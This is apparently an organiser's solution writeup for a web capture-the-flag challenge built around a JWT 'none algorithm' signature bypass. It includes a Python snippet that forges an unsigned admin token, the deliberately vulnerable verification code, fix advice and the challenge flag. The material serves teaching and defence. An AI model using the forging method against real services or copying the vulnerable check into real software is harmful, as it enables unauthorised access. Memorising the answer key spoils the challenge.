# Beta Access: Solution Writeup

**Category:** Web  
**Difficulty:** Medium  
**Vulnerability:** Privilege Escalation via JWT "none algorithm" signature bypass  
**Flag:** `CGS{n0n3_4lg_jwt_byp4ss}`

> Organiser document. Do not share with participants.

---

## Overview

Beta Access issues a JWT-style token on login, stored in the `session_token` cookie.
The token looks like `header.payload.signature`, each part base64url-encoded:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicGxheWVyMSIsInJvbGUiOiJ0ZXN0ZXIifQ.<signature>
```

Decoded, the payload looks like:

```json
{"user": "player1", "role": "tester"}
```

The `/insider` page correctly checks `role == "admin"`. The bug is in how the server verifies the
token: if the header's `alg` is `"none"`, the server skips signature verification completely and
trusts the payload. This is the classic JWT "none algorithm" vulnerability.

---

## Solution

### Step 1: Register and log in

Create a tester account at `/register`, then log in. A cookie named `session_token` is set.

### Step 2: Inspect the token

Open DevTools (`F12`) > Application/Storage > Cookies, and copy the `session_token` value.
It has three parts separated by dots. Decode the first two with any base64url decoder
(or `jwt.io`, paste in "Debugger" without worrying about the signature):

```
Header:  {"alg":"HS256","typ":"JWT"}
Payload: {"user":"player1","role":"tester"}
```

### Step 3: Try the Insider Tools page

Visit `/insider` while logged in as a tester. The server returns 403, "admins only".

### Step 4: Forge a token with `alg: none`

Build a new token by hand (or with the short Python snippet below): change the header's `alg` to
`"none"`, change the payload's `role` to `"admin"`, and leave the signature part empty.

```python
import json, base64

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "player1", "role": "admin"}

h = b64url(json.dumps(header, separators=(",", ":")).encode())
p = b64url(json.dumps(payload, separators=(",", ":")).encode())

print(f"{h}.{p}.")   # note the trailing dot: an empty signature part
```

### Step 5: Replace the cookie

In DevTools, set `session_token` to the new value from Step 4, then reload `/insider`.

The server sees `alg: "none"`, skips the signature check, and trusts `role: "admin"`.
The Insider Tools page opens, and the release signing key is the flag:

```
CGS{n0n3_4lg_jwt_byp4ss}
```

---

## Solve flow at a glance

```
Register -> Login -> Inspect session_token cookie -> Decode header/payload
-> /insider -> 403 (role: tester) -> Build a token with alg "none", role "admin", empty signature
-> Replace the cookie -> Reload /insider -> Flag
```

---

## Root cause (the vulnerable code)

```python
def verify_token(token):
    h_part, p_part, s_part = token.split(".")
    header = json.loads(b64url_decode(h_part))
    payload = json.loads(b64url_decode(p_part))

    alg = header.get("alg", "")
    if alg.lower() == "none":
        return payload   # <-- no signature check at all
    ...
```

## How to fix it

- Never honour `alg: none`. Reject any token whose algorithm does not match exactly what the
  server expects (here, always require `HS256` and verify the HMAC).
- Do not read the algorithm from the token at all when only one algorithm is used server-side;
  pin it in code instead of trusting the header.
- Prefer a maintained JWT library (PyJWT, authlib) over hand-rolled verification, and keep it
  configured to an explicit allow-list of algorithms.

---

## Notes for organisers

- Keep this file in the project root, **not** inside `static/` or `templates/`, because Flask
  serves `static/` publicly.
- The default flag can be changed with the `FLAG` environment variable. Keep the full flag
  (including `CGS{` and `}`) between 19 and 25 characters.
- Users live in memory and reset on restart. The admin account is always named `admin`, with a
  random password nobody is meant to guess, but the challenge does not require guessing it.
